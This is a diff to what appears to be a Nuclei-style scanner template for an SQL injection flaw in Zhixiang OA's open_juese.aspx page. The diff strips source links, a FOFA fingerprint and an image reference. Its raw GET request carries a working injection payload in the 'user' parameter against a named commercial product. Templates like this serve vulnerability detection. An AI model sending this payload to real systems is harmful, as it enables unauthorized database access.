@@ -3,17 +3,11 @@ info:
   name: 致翔软件致翔OA-open_juese存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ecwga3x2mgafgmg0'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ecwga3x2mgafgmg0
-    fofa: app="致翔软件-致翔OA"
 http:
 - raw:
-  - 'GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr= HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730682403861-7167b465-6538-449b-8a2a-3415c31c07ac.png)'
+  - GET /OpenWindows/open_juese.aspx?key=1&name=1&user=-1)+and+1=user--+&requeststr= HTTP/1.1
   redirects: false
   matchers:
   - status:
